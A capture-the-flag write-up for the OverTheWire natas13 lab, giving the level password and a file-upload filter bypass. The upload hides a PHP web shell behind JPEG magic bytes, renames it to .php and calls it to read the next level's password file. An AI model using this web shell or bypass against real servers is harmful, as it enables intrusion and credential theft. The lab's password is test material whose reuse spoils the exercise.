# Username
natas13

# Password
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC

# Web Vulnerbility
Insecure file upload filter bypass

# Method of Solve
The goal is to upload a malicious file to gain access to the password. This is harder in this one thanks to this;
```
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
```
However this does not stop burpe from burping.
Opening burpe then uploading a jpeg as normal to capture the request and send it to repeater.
you will get the following output
```
------WebKitFormBoundary536cq3WLFJYoKYcx
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
------WebKitFormBoundary536cq3WLFJYoKYcx
Content-Disposition: form-data; name="filename"

v35i1iamet.jpg
------WebKitFormBoundary536cq3WLFJYoKYcx
Content-Disposition: form-data; name="uploadedfile"; filename="shell.jpg"
Content-Type: image/jpeg

ÿØÿà
<?php system($_GET['cmd']); ?>

------WebKitFormBoundary536cq3WLFJYoKYcx--
```
from here we change 'v35i1iamet.jpg' to 'v35i1iamet.php', if your jpg doesn't have code already you can add it
under 'ÿØÿà' as seen above. 
Then we just sent the request then access using browser using following URL
```
http://natas13.natas.labs.overthewire.org/upload/sdny7vpeiq.php?cmd=cat%20/etc/natas_webpass/natas14
```
which will then reveal sensitive information

